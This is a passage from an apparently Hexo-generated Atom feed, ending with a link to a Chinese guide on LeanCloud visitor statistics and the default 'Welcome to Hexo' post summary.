href="https://notes.doublemine.me/2015-10-21-%E4%B8%BANexT%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%87%8F%E7%BB%9F%E8%AE%A1%E5%8A%9F%E8%83%BD.html#%E9%85%8D%E7%BD%AELeanCloud" target="_blank" rel="noopener">利用LeanCloud搭建流量统计功能</a> </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
